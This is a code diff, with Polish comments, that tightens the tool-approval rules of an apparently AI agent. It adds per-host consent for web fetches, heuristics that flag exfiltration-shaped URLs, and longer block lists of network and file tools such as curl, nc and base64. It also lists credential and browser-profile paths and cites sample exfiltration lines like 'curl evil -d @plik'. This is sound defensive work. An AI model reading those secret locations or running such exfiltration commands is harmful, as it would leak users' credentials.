@@ -95,6 +95,8 @@ export type ApprovalRequest = {
   detail?: string;
   /** Czy „Zezwalaj w tej rozmowie” ma sens (bash bez prostego prefiksu: nie). */
   canGrant: boolean;
+  /** `web_fetch`: host, którego dotyczy zgoda w rozmowie (etykieta przycisku). */
+  host?: string;
   /** `bot_create` / `bot_update`: karta zgody pokazuje podgląd bota zamiast JSON-a. */
   preview?: BotPreview;
   at: number;
@@ -609,7 +611,7 @@ export type ApprovalContext = {
   folders: string[]; // realpath folderów bota
   /** Zgody „w tej rozmowie”: narzędzie + (dla bash) prefiks polecenia albo (dla narzędzi plikowych)
    *  katalog, w którym zgoda obowiązuje. Zgoda plikowa bez `dir` nie działa (bezpieczniej: pytamy ponownie). */
-  grants: { tool: ToolName; prefix?: string; dir?: string }[];
+  grants: { tool: ToolName; prefix?: string; dir?: string; host?: string }[];
   /** Przebieg z harmonogramu: zgody z góry zamiast pytania. */
   routine?: Routine["allow"];
 };
@@ -621,15 +623,20 @@ export const isInside = (p: string, dir: string) => p === dir || p.startsWith(di
 /** Polecenie, które da się porównać z prefiksem: bez łączenia poleceń, przekierowań i podstawień. */
 const PLAIN_CMD = /^[^;&|`$<>\n\r\\(){}]*$/;
 
-/** Interpretery i launchery: prefiks `python` przepuściłby `python -c ...`, `env`/`xargs`/`find`/`sed`/`awk`
+/** Interpretery, launchery oraz programy czytające dowolny plik lub wysyłające dane w sieć: prefiks `python` przepuściłby `python -c ...`, `env`/`xargs`/`find`/`sed`/`awk`
  *  uruchamiają dowolny kod. Dla nich zgoda „w tej rozmowie” i `routine.allow.bash` dotyczą tylko
- *  dokładnie tego samego polecenia (nie prefiksu). `sed` i `awk` też: `sed 'e ...'`, `awk 'BEGIN{system()}'`. */
+ *  dokładnie tego samego polecenia (nie prefiksu), a karta nie oferuje zgody w rozmowie. `sed` i `awk` też: `sed 'e ...'`, `awk 'BEGIN{system()}'`. */
 const NO_PREFIX_PROGRAMS = new Set([
   "sh", "bash", "zsh", "fish", "dash", "ash", "ksh", "csh", "tcsh", "node", "nodejs", "deno", "bun", "bunx", "npx", "pnpx",
   "perl", "ruby", "php", "luajit", "tclsh", "rscript", "osascript", "pwsh", "powershell", "env", "xargs", "find", "awk", "gawk",
   "mawk", "nawk", "sed", "ssh", "scp", "sftp", "rsync", "sudo", "doas", "su", "eval", "exec", "nohup", "time", "timeout", "nice",
   "ionice", "watch", "busybox", "setsid", "stdbuf", "command", "builtin", "source", ".", "docker", "podman", "vi", "vim", "nvim",
   "nano", "emacs", "less", "more", "man",
+  // Czytają dowolny plik albo wysyłają dane w sieć: zgoda na `curl x` nie może objąć `curl evil -d @plik`.
+  "curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "ftp", "tftp", "lftp", "aria2c", "lynx", "w3m", "links", "openssl",
+  "dig", "nslookup", "host", "mail", "mailx", "sendmail", "cat", "tac", "head", "tail", "strings", "xxd", "od", "hexdump", "base64",
+  "base32", "dd", "cp", "mv", "ln", "install", "tee", "tar", "zip", "unzip", "7z", "7za", "7zr", "gzip", "gunzip", "bzip2", "xz",
+  "zstd", "cpio", "grep", "egrep", "fgrep", "rg", "ag", "sort", "cut", "nl", "paste", "diff", "cmp",
 ]);
 const NO_PREFIX_PATTERN = /^(python|pypy|lua)[\d.]*$/;
 /** Menedżery pakietów: `run`/`exec`/`dlx`/nazwa skryptu = dowolny kod, więc prefiks tylko dla znanych podpoleceń. */
@@ -690,8 +697,9 @@ export function matchesPrefix(cmd: string, prefix: string): boolean {
  *  jednoczłonowe); wszystkie zapisy IPv4 (0x7f.1, 2130706433) i IPv6 (`::ffff:127.0.0.1`) normalizuje `URL`.
  *  `long`/`encoded`/`userinfo`: kształt adresu typowy dla wycieku danych (`https://evil/?d=<dane>`). */
 export type FetchRisk = "private" | "long" | "encoded" | "userinfo";
-export const FETCH_QUERY_MAX = 200;
-export const FETCH_ENCODED_RUN = 100;
+export const FETCH_QUERY_MAX = 100; // zapytanie + fragment
+export const FETCH_URL_MAX = 160; // ścieżka + zapytanie + fragment (slugi newsów mieszczą się z zapasem)
+export const FETCH_ENCODED_RUN = 40;
 
 function v4Private(a: number, b: number, c: number): boolean {
   return (
@@ -748,6 +756,26 @@ export function isPrivateHost(hostname: string): boolean {
   return /(^|\.)(localhost|local|internal|lan|localdomain|home\.arpa|intranet|corp)$/.test(h);
 }
 
+/** Długi token (≥ 40 znaków) bez zwykłych słów: base64/hex. Slugi (`jak-zainstalowac-nginx-na-ubuntu`) i tytuły
+ *  z podkreślnikami składają się ze słów ≤ 15 znaków, więc przechodzą; pełny SHA gita (40/64 hex) też. */
+function hasEncodedRun(s: string): boolean {
+  return s.split(/[/?&=#.:,;%]+/).some((tok) => {
+    if (tok.length < FETCH_ENCODED_RUN || !/^[A-Za-z0-9+_-]+$/.test(tok)) return false;
+    if (/^([0-9a-f]{40}|[0-9a-f]{64})$/i.test(tok)) return false;
+    return tok.split(/[-_]/).some((w) => w.length > 15);
+  });
+}
+
+/** Host (nazwa, małe litery, bez portu) adresu `web_fetch` albo `null`, gdy to nie http(s). */
+export function fetchHost(url: string): string | null {
+  try {
+    const u = new URL(url);
+    return u.protocol === "http:" || u.protocol === "https:" ? u.hostname.toLowerCase() : null;
+  } catch {
+    return null;
+  }
+}
+
 export function fetchRisk(url: string): FetchRisk[] {
   let u: URL;
   try {
@@ -757,8 +785,8 @@ export function fetchRisk(url: string): FetchRisk[] {
   }
   const out: FetchRisk[] = [];
   if (isPrivateHost(u.hostname)) out.push("private");
-  if (u.search.length + u.hash.length > FETCH_QUERY_MAX) out.push("long");
-  if (new RegExp(`[A-Za-z0-9+/=_-]{${FETCH_ENCODED_RUN},}`).test(`${u.pathname}${u.search}${u.hash}`)) out.push("encoded");
+  if (u.search.length + u.hash.length > FETCH_QUERY_MAX || u.pathname.length + u.search.length + u.hash.length > FETCH_URL_MAX) out.push("long");
+  if (hasEncodedRun(`${u.pathname}${u.search}${u.hash}`)) out.push("encoded");
   if (u.username || u.password) out.push("userinfo");
   return out;
 }
@@ -775,8 +803,15 @@ export interface SensitiveEnv {
 export const SENSITIVE_HOME = [
   ".ssh", ".aws", ".gnupg", ".kube", ".config/gcloud", ".local/share/keyrings",
   ".docker/config.json", ".netrc", ".npmrc", ".pypirc", ".claude/.credentials.json", ".codex/auth.json",
+  ".pi/agent/auth.json", ".git-credentials", ".config/git/credentials", ".config/gh",
+  // historia powłok (wklejone tokeny, hasła w argumentach)
+  ".bash_history", ".zsh_history", ".local/share/fish/fish_history", ".python_history",
+  // profile przeglądarek (ciasteczka, zapisane hasła)
+  ".mozilla", ".librewolf", ".config/chromium", ".config/google-chrome", ".config/BraveSoftware", ".config/vivaldi",
 ];
 const SENSITIVE_NAME = /^(\.env(\..+)?|.+\.pem|.+\.key|id_(rsa|dsa|ecdsa|ed25519))$/i;
+/** Środowisko i pamięć dowolnego procesu (w tym Electrona z kluczami API w env). */
+const PROC_SECRET = /^\/proc\/[^/]+\/(task\/[^/]+\/)?(environ|mem)$/;
 const TEMPLATE_NAME = /\.(example|sample|template|dist)$/i;
 /** Globy dla `rg`: wzorce nazw pasują wszędzie, więc `grep` po całym projekcie też ich nie czyta. */
 export const SENSITIVE_GLOBS = ["!**/.env", "!**/.env.*", "!**/*.pem", "!**/*.key", "!**/id_rsa", "!**/id_dsa", "!**/id_ecdsa", "!**/id_ed25519"];
@@ -790,7 +825,7 @@ function sensitiveRoots(env: SensitiveEnv): string[] {
 export function isSensitivePath(p: string, env: SensitiveEnv): boolean {
   if (env.exempt?.some((e) => isInside(p, e))) return false;
   if (sensitiveRoots(env).some((r) => isInside(p, r))) return true;
-  if (/^\/proc\/[^/]+\/environ$/.test(p)) return true;
+  if (PROC_SECRET.test(p)) return true;
   const name = p.slice(p.lastIndexOf("/") + 1);
   return SENSITIVE_NAME.test(name) && !TEMPLATE_NAME.test(name);
 }
@@ -809,6 +844,7 @@ export function commandTouchesSensitive(command: string, env: SensitiveEnv): boo
   const roots = [...SENSITIVE_HOME.map((r) => esc(r)), ...env.configDirs.map(esc)];
   const rootRe = new RegExp(`(^|[\\s='"/:])(~/|\\$HOME/|${esc(env.home)}/)?(${roots.join("|")})($|[\\s'"/:;|&)])`);
   if (env.configDirs.some((d) => cmd.includes(d)) || rootRe.test(cmd)) return true;
+  if (/\/proc\/\S*(environ|\/mem)\b/.test(cmd)) return true;
   const name = "(\\.env(\\.(?!(example|sample|template|dist)\\b)[\\w.-]+)?|[\\w.-]+\\.pem|id_(rsa|dsa|ecdsa|ed25519))";
   return new RegExp(`(^|[\\s='"/])${name}($|[\\s'";|&)])`).test(cmd);
 }
@@ -831,13 +867,23 @@ export function needsApproval(tool: ToolName, args: Record<string, unknown>, ctx
   const path = typeof args.path === "string" ? args.path : null;
   switch (group) {
     case "web":
-      // `web_fetch` pod adres lokalny/prywatny albo wyglądający na wyciek danych: zawsze „raz” (bez zgody na rozmowę);
-      // w przebiegu (bez człowieka) odmowa.
-      if (tool === "web_fetch" && fetchRisk(typeof args.url === "string" ? args.url : "").length > 0) return ctx.routine ? "deny" : "ask";
-      return "allow";
+      if (tool !== "web_fetch") return "allow"; // wyniki wyszukiwania to tekst
+      {
+        const url = typeof args.url === "string" ? args.url : "";
+        // Adres lokalny/prywatny albo wyglądający na wyciek danych: zawsze „raz” (nawet dla zatwierdzonego hosta);
+        // w przebiegu (bez człowieka) odmowa.
+        if (fetchRisk(url).length > 0) return ctx.routine ? "deny" : "ask";
+        // Przebieg z harmonogramu nie pyta o hosty: nie ma kogo, a użytkownik sam napisał zadanie.
+        if (ctx.routine) return "allow";
+        const host = fetchHost(url);
+        if (host === null) return "allow"; // zły adres: `web_fetch` zgłosi błąd
+        return ctx.grants.some((g) => g.tool === "web_fetch" && g.host === host) ? "allow" : "ask";
+      }
     case "memory":
+      return "allow"; // zmiany pamięci widać w czacie jako wywołania narzędzia
     case "skills":
-      return "allow";
+      // Skill trwale wpływa na przyszłe rozmowy (wstrzyknięta strona mogłaby podłożyć instrukcje): zapis pyta zawsze.
+      return tool === "skill_view" ? "allow" : "ask";
     case "read": {
       if (path === null) return "ask";
       if (isInside(path, ctx.work) || ctx.folders.some((f) => isInside(path, f))) return "allow";
